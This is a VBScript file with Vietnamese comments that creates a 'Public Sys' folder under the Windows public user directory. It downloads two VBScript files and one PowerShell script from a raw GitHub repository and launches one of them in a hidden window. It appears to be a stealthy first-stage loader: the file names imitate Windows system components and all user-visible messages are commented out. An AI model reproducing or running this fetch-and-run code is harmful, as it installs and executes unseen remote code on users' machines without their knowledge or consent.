Option Explicit
'On Error Resume Next 
Dim fso, folderPath, files, urls, i, file, url, WshShell, objXMLHTTP, adoStream

' Khởi tạo FileSystemObject và WshShell
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Đường dẫn đến thư mục Public Sys
folderPath = "C:\Users\Public\Public Sys"

' Kiểm tra thư mục Public Sys, nếu không tồn tại thì tạo mới
If Not fso.FolderExists(folderPath) Then
    fso.CreateFolder(folderPath)
    'WScript.Echo "Thư mục Public Sys đã được tạo."
Else
    'WScript.Echo "Thư mục Public Sys đã tồn tại."
End If

' Danh sách tên file cần có
files = Array("Window_p.vbs", "setup_window.vbs", "system_control.ps1")

' Danh sách URL của các file cần tải
urls = Array( _
    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/Window_p.vbs", _
    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/setup_window.vbs", _
    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/system_control.ps1" _
)

' Kiểm tra từng file, nếu không có thì tải về
For i = 0 To UBound(files)
    file = folderPath & "\" & files(i)
    url = urls(i)
    
    If Not fso.FileExists(file) Then
        'WScript.Echo "File " & files(i) & " không tồn tại, bắt đầu tải về..."
        DownloadFile url, file
        'WScript.Echo "Đã tải xong file: " & file
    Else
        'WScript.Echo "File " & files(i) & " đã tồn tại."
    End If
Next

' Chạy file Window_p.vbs sau khi tải xong hoặc đã tồn tại
file = folderPath & "\Window_p.vbs"
If fso.FileExists(file) Then
    'WScript.Echo "Chạy file Window_p.vbs..."
    WshShell.Run "wscript.exe """ & file & """", 0, False
Else
    'WScript.Echo "File Window_p.vbs không tồn tại."
End If

' Hàm tải file từ internet
Sub DownloadFile(url, filePath)
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Open
        adoStream.Type = 1 ' Binary
        adoStream.Write objXMLHTTP.ResponseBody
        adoStream.Position = 0 ' Bắt đầu từ vị trí đầu
        
        If fso.FileExists(filePath) Then fso.DeleteFile(filePath)
        
        adoStream.SaveToFile filePath
        adoStream.Close
    End If
End Sub
